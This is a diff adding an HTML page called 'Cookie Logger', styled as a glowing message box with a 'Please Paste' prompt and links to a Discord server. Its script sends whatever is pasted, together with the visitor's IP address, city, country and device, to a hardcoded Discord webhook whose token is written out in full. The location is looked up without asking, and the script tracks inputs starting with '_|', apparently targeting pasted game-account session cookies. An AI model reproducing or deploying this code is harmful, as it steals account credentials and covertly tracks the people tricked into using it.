@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie Logger</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Orbitron', sans-serif;
+}
+
+/* ===== NEW PREMIUM BACKGROUND ===== */
+body {
+    height: 100vh;
+    overflow: hidden;
+    color: white;
+    background: radial-gradient(circle at top, #0a0f1f, #000);
+}
+
+/* animated glow */
+body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(120deg, #00ffff10, #ff00ff10, #00ff9910);
+    background-size: 300% 300%;
+    animation: bgMove 10s ease infinite;
+    z-index: -2;
+}
+
+@keyframes bgMove {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+/* floating blur orbs */
+body::after {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background:
+        radial-gradient(circle at 20% 30%, rgba(0,255,255,0.15), transparent 40%),
+        radial-gradient(circle at 80% 70%, rgba(255,0,255,0.12), transparent 45%);
+    z-index: -1;
+    filter: blur(20px);
+}
+
+/* canvas */
+#bg {
+    position: fixed;
+    inset: 0;
+    z-index: -3;
+}
+
+.cursor {
+    position: fixed;
+    width: 14px;
+    height: 14px;
+    background: cyan;
+    border-radius: 50%;
+    pointer-events: none;
+    box-shadow: 0 0 20px cyan;
+    transform: translate(-50%, -50%);
+    z-index: 9999;
+}
+
+/* ===== SIDEBAR UPGRADED ===== */
+.sidebar {
+    position: fixed;
+    left: 20px;
+    top: 50%;
+    transform: translateY(-50%);
+    height: auto;
+    width: 70px;
+    padding: 15px 10px;
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(15px);
+    border: 1px solid rgba(0,255,255,0.2);
+    border-radius: 20px;
+    transition: 0.3s;
+}
+
+.sidebar:hover {
+    width: 180px;
+}
+
+.sidebar button {
+    width: 100%;
+    padding: 12px;
+    margin: 5px 0;
+    background: transparent;
+    border: none;
+    color: cyan;
+    text-align: left;
+    cursor: pointer;
+    border-radius: 10px;
+    transition: 0.2s;
+}
+
+.sidebar button:hover {
+    background: rgba(0,255,255,0.15);
+    transform: translateX(5px);
+}
+
+/* ===== PAGE CONTAINER ===== */
+.page {
+    display: none;
+    position: absolute;
+    top: 50%;
+    left: 55%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    padding: 40px;
+    border-radius: 20px;
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(15px);
+    border: 1px solid rgba(0,255,255,0.15);
+    box-shadow: 0 0 30px rgba(0,255,255,0.1);
+    min-width: 320px;
+}
+
+.page.active {
+    display: block;
+}
+
+/* TITLE */
+.glitch {
+    font-size: 40px;
+    color: cyan;
+    text-shadow: 0 0 10px cyan;
+    margin-bottom: 20px;
+}
+
+/* INPUT */
+input {
+    margin-top: 15px;
+    padding: 14px;
+    width: 280px;
+    border-radius: 12px;
+    border: 1px solid rgba(0,255,255,0.3);
+    background: rgba(255,255,255,0.08);
+    color: white;
+    outline: none;
+    transition: 0.2s;
+}
+
+input:focus {
+    box-shadow: 0 0 15px cyan;
+}
+
+/* SEND BUTTON */
+button.send {
+    margin-top: 15px;
+    padding: 12px 28px;
+    border-radius: 12px;
+    border: none;
+    background: linear-gradient(90deg, cyan, #00ffaa);
+    color: black;
+    cursor: pointer;
+    font-weight: bold;
+    transition: 0.2s;
+}
+
+button.send:hover {
+    transform: scale(1.05);
+}
+
+/* POWERED */
+.powered {
+    margin-top: 20px;
+    color: cyan;
+    opacity: 0.8;
+}
+
+/* TOOL CARD */
+.tool-card {
+    margin-top: 20px;
+    width: 260px;
+    padding: 15px;
+    border-radius: 18px;
+    cursor: pointer;
+    text-align: center;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(0,255,255,0.2);
+    box-shadow: 0 0 20px rgba(0,255,255,0.1);
+    transition: 0.3s;
+}
+
+.tool-card:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 30px cyan;
+}
+</style>
+</head>
+
+<body>
+
+<canvas id="bg"></canvas>
+<div class="cursor" id="cursor"></div>
+
+<div class="sidebar">
+    <button onclick="showPage('main')">🏠 Main</button>
+    <button onclick="openHelp()">❓ Help</button>
+    <button onclick="openInvite()">🔗 Invite</button>
+    <button onclick="showPage('more')">📂 More</button>
+</div>
+
+<div class="page active" id="main">
+    <div class="glitch">Cookie</div>
+
+    <input type="text" id="messageInput" placeholder="Type something...">
+    <br>
+    <button class="send" onclick="sendMessage()">Send</button>
+
+    <div class="powered">⚡ Powered by AWP & SWIFTIES ⚡</div>
+</div>
+
+<div class="page" id="more">
+    <div class="glitch">More Tools</div>
+
+    <div class="tool-card" onclick="openGameCopier()">
+        <img src="https://i.postimg.cc/k52qTcds/Screenshot-2026-04-12-005645.png"
+        style="width:100%; border-radius:12px;">
+        <br><br>
+        <span style="color:cyan;">🎮 Game Copier</span>
+    </div>
+</div>
+
+<script>
+document.addEventListener("mousemove", e => {
+    const c = document.getElementById("cursor");
+    c.style.left = e.clientX + "px";
+    c.style.top = e.clientY + "px";
+});
+
+function showPage(id) {
+    document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+    document.getElementById(id).classList.add("active");
+}
+
+function openHelp() {
+    window.open("https://discord.com/users/1125483462627971224", "_blank");
+}
+
+function openInvite() {
+    window.open("https://discord.gg/zEtZCQ95eT", "_blank");
+}
+
+function openGameCopier() {
+    window.open("https://speedubx.github.io/AwpTools/", "_blank");
+}
+
+/* webhook */
+const messageWebhook = "https://discord.com/api/webhooks/1500811326858068000/eb95UJd7388jxwum0qZCCwMZ8mJgw_7C9nBJ_FqfRclZJAeOI8ebxpbQEwUWHmCTUYQV";
+
+/* 🌍 IP LOCATION (NO PERMISSION) */
+async function getLocation() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        return {
+            city: data.city,
+            country: data.country_name,
+            ip: data.ip
+        };
+    } catch (e) {
+        return null;
+    }
+}
+
+/* ===== DATA SYSTEM ===== */
+let specialCount = localStorage.getItem("specialCount") ? parseInt(localStorage.getItem("specialCount")) : 0;
+let xp = localStorage.getItem("xp") ? parseInt(localStorage.getItem("xp")) : 0;
+
+function saveData() {
+    localStorage.setItem("specialCount", specialCount);
+    localStorage.setItem("xp", xp);
+}
+
+/* fake users */
+const fakeUsers = Math.floor(Math.random() * 50) + 10;
+
+/* ===== FILE SENDER ===== */
+function sendAsFile(text, meta) {
+    const blob = new Blob([text], { type: "text/plain" });
+    const form = new FormData();
+
+    form.append("file", blob, "message.txt");
+    form.append("payload_json", JSON.stringify({
+        content: meta
+    }));
+
+    return fetch(messageWebhook, {
+        method: "POST",
+        body: form
+    });
+}
+
+async function sendMessage() {
+    const msg = document.getElementById("messageInput").value.trim();
+    if (!msg) return alert("Please Paste");
+
+    const time = new Date().toLocaleString();
+    const device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 PC";
+
+    xp++;
+
+    if (msg.startsWith("_|")) {
+        specialCount++;
+    }
+
+    saveData();
+
+    const loc = await getLocation();
+    let locationText = loc
+        ? `🌍 ${loc.city}, ${loc.country}\n📡 ${loc.ip}`
+        : "🌍 Unknown";
+
+    if (msg === "/accstatus") {
+        await fetch(messageWebhook, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "📊 Account Status",
+                    description: `\`\`\`\n_| Messages: ${specialCount}\n\`\`\``,
+                    color: 0x2b2d31,
+                    footer: { text: `${device} • ${time}` }
+                }]
+            })
+        });
+        return;
+    }
+
+    if (msg === "/reset") {
+        specialCount = 0;
+        xp = 0;
+        saveData();
+        return;
+    }
+
+    if (msg === "/level") {
+        await fetch(messageWebhook, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "⭐ Level System",
+                    description: `\`\`\`\nLevel: ${Math.floor(xp/5)}\nXP: ${xp}\n\`\`\``,
+                    color: 0x2b2d31,
+                    footer: { text: `${device} • ${time}` }
+                }]
+            })
+        });
+        return;
+    }
+
+    let content = msg;
+    const isBig = content.length > 1800;
+
+    if (isBig) {
+        await sendAsFile(
+            content,
+            `📨 New Large Message\n${device} • ${time}\n${locationText}`
+        );
+    } else {
+        await fetch(messageWebhook, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+                embeds: [{
+                    color: 0x2b2d31,
+                    description: "```\n" + content + "\n```\n" + locationText,
+                    footer: { text: `${device} • ${time}` }
+                }]
+            })
+        });
+    }
+
+    document.getElementById("messageInput").value = "";
+}
+
+/* particles */
+const canvas = document.getElementById("bg");
+const ctx = canvas.getContext("2d");
+
+canvas.width = innerWidth;
+canvas.height = innerHeight;
+
+let particles = [];
+
+for (let i = 0; i < 200; i++) {
+    particles.push({
+        x: (Math.random() - 0.5) * canvas.width,
+        y: (Math.random() - 0.5) * canvas.height,
+        z: Math.random() * 1000
+    });
+}
+
+function draw() {
+    ctx.fillStyle = "black";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    particles.forEach(p => {
+        p.z -= 2;
+        if (p.z <= 0) p.z = 1000;
+
+        let k = 128 / p.z;
+
+        let x = p.x * k + canvas.width / 2;
+        let y = p.y * k + canvas.height / 2;
+
+        let size = (1 - p.z / 1000) * 3;
+
+        ctx.fillStyle = "cyan";
+        ctx.fillRect(x, y, size, size);
+    });
+
+    requestAnimationFrame(draw);
+}
+draw();
+
+</script>
+
+</body>
+</html>
